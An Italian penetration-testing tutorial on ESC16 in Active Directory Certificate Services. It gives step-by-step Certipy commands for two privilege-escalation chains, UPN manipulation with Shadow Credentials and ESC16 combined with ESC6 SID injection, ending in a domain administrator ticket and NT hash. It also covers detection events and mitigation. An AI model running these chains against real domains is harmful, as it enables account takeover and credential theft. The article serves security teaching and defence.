---
title: 'ESC16 ADCS: CA Senza SID Security Extension, Exploit e Fix'
slug: esc16-adcs
description: 'ESC16 in AD CS: la CA non inserisce il SID nei certificati. Scopri identificazione con Certipy, privesc, catena ESC16+ESC6 e mitigazione aggiornata al 2026.'
image: /BCO.52f4c812-c2f0-4287-a6c2-cc8fe8e63860.webp
draft: false
date: 2026-03-10T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC16
  - AD CS
  - Privilege Escalation
  - certipy
---

# ESC16 in Active Directory Certificate Services: CA con SID Security Extension disabilitata globalmente

ESC16 è una misconfigurazione di **Active Directory Certificate Services (AD CS)** in cui è la **Certificate Authority stessa**, non un singolo template, a non includere la **SID security extension** in nessun certificato che emette. È stata descritta per la prima volta da Will Schroeder nel 2022 come effetto collaterale di un workaround usato per mitigare l'interazione tra ESC6 ed ESC7, e in seguito catalogata come ESC16 da Oliver Lyak (autore di Certipy).

In una riga: **ESC16 è ESC9 applicato a livello di CA invece che a livello di singolo template**. Ma a differenza di quanto si legge spesso, l'assenza della SID extension **non significa automaticamente** che l'autenticazione con un certificato "debole" andrà a buon fine — dipende da come sono configurati i Domain Controller, e qui molte guide (inclusa la bozza originale di questo articolo) sbagliano.

## Glossario rapido

| Termine                                                 | Significato in una riga                                                                                                                                |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **AD CS**                                               | Il servizio di Active Directory che emette certificati digitali.                                                                                       |
| **Security Extension (szOID\_NTDS\_CA\_SECURITY\_EXT)** | Estensione del certificato (OID `1.3.6.1.4.1.311.25.2`) che incorpora il SID del titolare, usata dal KDC per il mapping forte.                         |
| **DisableExtensionList**                                | Chiave di registro della CA che elenca le estensioni da NON inserire nei certificati emessi.                                                           |
| **StrongCertificateBindingEnforcement**                 | Chiave di registro, storicamente sui DC, che controllava quanto rigidamente veniva richiesto il mapping forte — oggi superata (vedi sezione dedicata). |
| **SAN (Subject Alternative Name)**                      | Campo del certificato con identità aggiuntive (UPN, email, o — come in ESC6+ESC16 — un SID in formato URL).                                            |
| **SAN URL SID**                                         | Formato specifico (`tag:microsoft.com,2022-09-14:sid:<SID>`) con cui un SID può essere inserito nel SAN quando manca la Security Extension nativa.     |
| **UPN (User Principal Name)**                           | L'identità in stile email (`utente@dominio`) con cui un account si autentica.                                                                          |
| **Shadow Credentials**                                  | Tecnica che scrive una chiave pubblica falsa su `msDS-KeyCredentialLink` di un account per poterlo impersonare via PKINIT.                             |
| **KDC (Key Distribution Center)**                       | Il servizio Kerberos sul Domain Controller che rilascia i ticket e decide se un certificato è valido per l'autenticazione.                             |

Per i concetti base di Certipy e Kerberos: [Certipy: guida completa](https://hackita.it/articoli/certipy/), [Kerberos: attacchi Active Directory](https://hackita.it/articoli/kerberos/).

## Dove nasce la misconfigurazione

La CA disabilita l'estensione tramite una chiave di registro sul server CA:

```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\<PolicyModule>\DisableExtensionList
```

Se quel valore contiene l'OID `1.3.6.1.4.1.311.25.2`, la CA non inserirà **mai** la Security Extension in nessun certificato, indipendentemente dal template usato. Questo è l'esatto motivo per cui ESC16 viene descritto come "[ESC9](https://hackita.it/articoli/esc9-adcs/) a livello di CA": ESC9 disabilita l'estensione su un template specifico (`CT_FLAG_NO_SECURITY_EXTENSION`), ESC16 la disabilita per tutti i template della CA in un colpo.

C'è anche un secondo scenario, distinto da quello configurato esplicitamente: una **CA non aggiornata** che semplicemente non è ancora in grado di generare la Security Extension introdotta con gli update di sicurezza del 2022. In quel caso il sintomo è identico (certificati senza SID) ma la causa è una patch mancante, non una riga nel registro — vale la pena distinguerli prima di scrivere il report di un pentest.

## La correzione più importante: cosa succede davvero sui DC aggiornati

La bozza originale di questo articolo (e buona parte delle guide in giro) presenta la regola come:

> ESC16 è sfruttabile quando `StrongCertificateBindingEnforcement ≠ 2`

Questa regola **non è più accurata**. Microsoft ha completato la transizione al **Full Enforcement Mode** per il certificate mapping forte sui Domain Controller con gli aggiornamenti di febbraio 2025, e dal **9 settembre 2025** ha rimosso la possibilità di tornare in Compatibility Mode tramite quella chiave di registro. Sui DC aggiornati a quella data, la modalità di enforcement non è più qualcosa che deduci dal valore `0`/`1`/`2` di `StrongCertificateBindingEnforcement`: quella chiave, dopo l'installazione degli aggiornamenti pertinenti, non è più un controllo supportato.

Questo ha una conseguenza diretta sull'exploitation, spiegata scenario per scenario più sotto: **l'assenza della Security Extension non forza automaticamente un fallback a mapping debole**. Senza un mapping valido secondo le regole attualmente in vigore, il KDC può semplicemente rifiutare l'autenticazione. Se stai testando in laboratorio con DC aggiornati, la UPN manipulation "classica" (Scenario A più sotto) va quindi verificata caso per caso, non assunta come sempre valida.

## Matrice di sfruttabilità

| Scenario                                                 | Condizione da verificare                                                                                                                              | Esito tipico                                                                                   |
| -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| ESC16 senza ESC6, ambiente legacy/non ancora aggiornato  | Il DC accetta ancora un mapping debole (SAN UPN) in assenza di SID                                                                                    | UPN manipulation può funzionare                                                                |
| ESC16 senza ESC6, DC aggiornato (post-settembre 2025)    | Enforcement corrente attivo, nessun mapping forte alternativo disponibile                                                                             | UPN manipulation classica probabilmente rifiutata                                              |
| ESC16 + ESC6                                             | CA con flag `EDITF_ATTRIBUTESUBJECTALTNAME2` attivo, template che consente l'auto-enrollment con SAN specificato dal richiedente, SID del target noto | La catena con SAN URL SID può funzionare anche con enforcement pieno                           |
| CA priva di Security Extension per mancato aggiornamento | Versione/patch della CA                                                                                                                               | Vulnerabilità reale ma non è ESC16 "configurato" — serve patch, non un intervento sul registro |

## Identificazione con Certipy

```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -vulnerable -stdout
```

Nell'output cerca:

```
Disabled Extensions : 1.3.6.1.4.1.311.25.2

[!] Vulnerabilities
    ESC16 : Security Extension is disabled
```

Questo ti dice che la CA non emette certificati con la Security Extension — non ti dice ancora se questo si traduce in un percorso di autenticazione utilizzabile. Per quello servono i due controlli successivi:

* **Da un host di assessment**: `certipy find` come sopra, per individuare l'indicatore.
* **Sulla CA, con permessi amministrativi**: `certutil -getreg policy\DisableExtensionList` per leggere la configurazione reale. Nota che questo secondo controllo richiede accesso alla CA, non è disponibile a un normale account di dominio — non dare per scontata la sua assenza come prova che la misconfigurazione non esiste.

## Exploitation

### Scenario A — UPN manipulation (ambienti legacy / pre-enforcement)

**Prerequisiti completi** (più articolati di "controllo UPN + enrollment"):

* Permesso di scrivere `userPrincipalName` su un account intermedio che hai già compromesso o controlli.
* Un modo per autenticarti come quell'account intermedio dopo la modifica — qui entra in gioco [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/) se hai anche il permesso di scrivere `msDS-KeyCredentialLink`, ma non è un prerequisito universale di ESC16: è solo una delle strade possibili, e richiede il suo proprio percorso PKINIT funzionante.
* Diritti di enrollment su un template che consente Client Authentication.
* Un Domain Controller che — qui sta il punto — accetti ancora il mapping debole risultante in assenza della Security Extension. Verificalo prima di investire tempo nello scenario.

**Step 1 — Leggere l'UPN attuale della vittima** (da ripristinare dopo)

```bash
certipy account -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -user victim read
```

**Step 2 — Impostare l'UPN della vittima su quello del target**

```bash
certipy account -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -user victim -upn 'administrator@corp.local' update
```

**Step 3 — Ottenere credenziali utilizzabili come vittima** (qui, Shadow Credentials)

```bash
certipy shadow -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -account victim auto
```

```
Saving credential cache to victim.ccache
```

**Step 4 — Richiedere il certificato**

```bash
export KRB5CCNAME=victim.ccache
certipy req -k -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca CORP-CA -template User
```

```
Got certificate with UPN 'administrator@corp.local'
Certificate has no object SID
Saving certificate to administrator.pfx
```

Attenzione: questo messaggio confirma solo che il certificato non contiene la Security Extension — non conferma ancora che il KDC lo accetterà per l'autenticazione. Vedi la sezione "Verificare il certificato" più sotto prima di procedere.

**Step 5 — Ripristinare l'UPN originale** e verificarlo via LDAP (non limitarti a fidarti del comando, rileggi l'attributo):

```bash
certipy account -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -user victim -upn 'victim@corp.local' update
certipy account -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -user victim read
```

**Step 6 — Autenticazione**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100 -username administrator -domain corp.local
```

```
Got TGT
Got NT hash for 'administrator'
```

**Troubleshooting**

* *L'autenticazione allo Step 6 viene rifiutata nonostante il certificato sia stato emesso*: molto probabile su un DC aggiornato post-settembre 2025 — l'assenza della Security Extension qui non garantisce un fallback debole. Verifica se l'ambiente è davvero ancora in una configurazione legacy prima di insistere su questo scenario, oppure passa allo Scenario B.
* *Shadow Credentials fallisce*: non hai scrittura su `msDS-KeyCredentialLink`, oppure l'ambiente non supporta PKINIT per quell'account — serve un metodo alternativo per autenticarti come l'account intermedio.
* *Il TGT arriva ma il recupero dell'hash NT no*: sono due operazioni distinte — un TGT valido non garantisce che il recupero dell'hash (che richiede un passo aggiuntivo tipo U2U) vada a buon fine. Non trattarlo come fallimento dell'intera catena.
* *Non riesci a leggere `DisableExtensionList` dalla CA*: serve accesso amministrativo locale alla CA, non basta un account di dominio qualsiasi — usa solo `certipy find` dal lato client in quel caso.

### Scenario B — ESC16 + ESC6 (funziona anche con enforcement pieno)

Questo è lo scenario più robusto, perché non dipende da un DC "indulgente": inietta direttamente un SID nel SAN in un formato che il KDC riconosce comunque come mapping forte.

**Prerequisiti**

* La CA presenta ESC16 (nessuna Security Extension nei certificati emessi).
* La stessa CA ha anche il flag `EDITF_ATTRIBUTESUBJECTALTNAME2` attivo — la condizione che rende possibile [ESC6](https://hackita.it/articoli/esc6-adcs/) — e quindi permette al richiedente di specificare SAN arbitrari.
* Diritti di enrollment su un template che consente Client Authentication.
* Il SID reale dell'account target (non dare per scontato che finisca per `-500`: quel RID identifica tipicamente l'account Administrator incorporato, ma può essere stato rinominato — verifica il SID effettivo, non il nome).

**Step 1 — Richiesta del certificato con SID iniettato nel SAN**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca CORP-CA \
  -template User \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-...-500'
```

Certipy, in assenza della Security Extension nativa, inserisce automaticamente il SID nel SAN nel formato:

```
URL=tag:microsoft.com,2022-09-14:sid:S-1-5-21-...-500
```

```
Saving certificate to administrator.pfx
```

**Step 2 — Verificare il certificato prima di autenticarti** (vedi sezione dedicata sotto)

**Step 3 — Autenticazione**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
```

```
Got TGT
Got NT hash for 'administrator'
```

Qui conviene distinguere tre verifiche, non limitarsi al messaggio finale:

| Verifica                                  | Cosa confirma                                                                          |
| ----------------------------------------- | -------------------------------------------------------------------------------------- |
| SAN UPN presente e corretto               | Il certificato porta l'identità attesa                                                 |
| SAN URL SID presente nel formato corretto | Il mapping forte alternativo è effettivamente nel certificato                          |
| TGT ottenuto per il principal previsto    | L'autenticazione Kerberos è riuscita per l'account giusto, non solo "un" TGT qualsiasi |

**Troubleshooting**

* *La richiesta fallisce*: la CA potrebbe non avere davvero il flag `EDITF_ATTRIBUTESUBJECTALTNAME2` attivo — verifica prima la presenza di ESC6 con `certipy find`, non limitarti a ESC16.
* *L'autenticazione fallisce nonostante il SAN URL SID sia presente*: controlla di aver usato il SID corretto — un errore comune è assumere che l'amministratore abbia RID `-500` quando l'account è stato rinominato o il vero target è un altro principal.
* *Vuoi sapere se questa catena funziona anche sul tuo ambiente specifico*: a differenza dello Scenario A, questo percorso non dipende dal Full Enforcement Mode, perché fornisce comunque un mapping "forte" via SAN — è il motivo per cui va preferito quando disponibile.

### Verificare il certificato

Non fidarti solo dei messaggi riepilogativi di Certipy: controlla il certificato stesso prima di spendere un tentativo di autenticazione.

Su Windows, con il certificato esportato in `.cer`:

```cmd
certutil -dump issued.cer
```

Oppure con [OpenSSL](https://hackita.it/articoli/openssl/) su un file PEM:

```bash
openssl x509 -in issued.pem -noout -text
```

Cerca l'OID `1.3.6.1.4.1.311.25.2` (dovrebbe essere assente, confermando ESC16) e, nello Scenario B, il SAN URL con il formato `tag:microsoft.com,2022-09-14:sid:...`.

## Detection

| Fonte                      | Evento/indicatore                                        | Cosa cercare                                                                                |
| -------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| Registro/configurazione CA | OID `1.3.6.1.4.1.311.25.2` in `DisableExtensionList`     | Misconfigurazione persistente, non episodica                                                |
| Security log della CA      | Eventi 4886 / 4887                                       | Richieste e rilasci di certificati — correlali con template e account richiedente           |
| Security log della CA      | Evento 4888                                              | Richieste negate — utile per capire se qualcuno ha già tentato lo Scenario B senza successo |
| Security log del DC        | Eventi KDC 39 / 40 (41 su sistemi più vecchi)            | Problemi di certificate mapping o certificati incompatibili con le regole correnti          |
| Security log del DC        | Evento 5136 (se l'auditing è configurato sull'attributo) | Modifiche a `userPrincipalName` o `msDS-KeyCredentialLink` — fondamentale per lo Scenario A |

Questi eventi richiedono auditing abilitato sia sul filtro della CA sia tramite Advanced Audit Policy — verificalo prima di concludere che l'assenza di eventi significhi assenza di attività.

## Mitigation

1. **Rimuovere l'OID dalla lista delle estensioni disabilitate sulla CA**:

```cmd
certutil -setreg policy\DisableExtensionList -1.3.6.1.4.1.311.25.2
net stop certsvc
net start certsvc
```

1. **Verificare che la correzione abbia effetto**: rileggi il registro (`certutil -getreg policy\DisableExtensionList`) ed emetti un certificato di test per confermare che la Security Extension sia di nuovo presente — non fermarti al solo comando di set.
2. **Gestire i certificati già emessi**: la modifica alla configurazione della CA non riscrive i certificati già rilasciati senza Security Extension. Vanno identificati e, dove necessario, rinnovati.
3. **Controllare anche ESC6**: se la CA ha anche il flag `EDITF_ATTRIBUTESUBJECTALTNAME2` attivo, disattivalo se non è necessario, per chiudere anche quella strada.
4. **Mantenere i Domain Controller aggiornati**: la raccomandazione storica di impostare `StrongCertificateBindingEnforcement = 2` non è più l'intervento operativo principale — ciò che conta oggi è avere i DC aggiornati con le modalità di enforcement correnti supportate da Microsoft, non il valore di quella chiave specifica.

## Quando ESC16 non è (realmente) sfruttabile

* La CA non ha l'OID nella `DisableExtensionList` e non presenta problemi di versione/patch.
* Hai verificato l'indicatore con `certipy find` ma il DC target è aggiornato e rifiuta comunque l'autenticazione via UPN manipulation (Scenario A) — e la CA non ha anche ESC6 per tentare lo Scenario B.
* Non hai i permessi necessari su nessun account intermedio (Scenario A) né il SID del target e un template abusabile via SAN (Scenario B).

## FAQ

**Cos'è ESC16?**
Una misconfigurazione in cui la CA non include la Security Extension (SID) in nessun certificato emesso — concettualmente [ESC9](https://hackita.it/articoli/esc9-adcs/) estesa a livello di CA invece che di singolo template.

**ESC16 funziona sempre su un Domain Controller aggiornato?**
No. La UPN manipulation classica non va considerata sfruttabile per default sui DC aggiornati dopo settembre 2025. La combinazione ESC16 + ESC6 resta invece un percorso valido quando i suoi prerequisiti sono soddisfatti, perché fornisce comunque un mapping riconosciuto come forte via SAN.

**ESC16 può portare a Domain Admin?**
Condizionatamente sì: serve poter impersonare un account effettivamente privilegiato e completare con successo l'autenticazione — non è un risultato garantito dalla sola presenza della misconfigurazione.

**ESC16 è uguale a ESC9?**
Concettualmente sì, ma a livello CA invece che di singolo template: ESC9 disabilita la Security Extension su un template specifico, ESC16 la disabilita su tutti.

***

Guida completa a tutte le tecniche ESC1–ESC16: [AD CS Privilege Escalation con Certipy](https://hackita.it/articoli/adcs-esc1-esc16/).

Fonti tecniche: [Certipy — Privilege Escalation Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation), [Microsoft KB5014754 — Certificate-based authentication changes](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4c43bd3690).
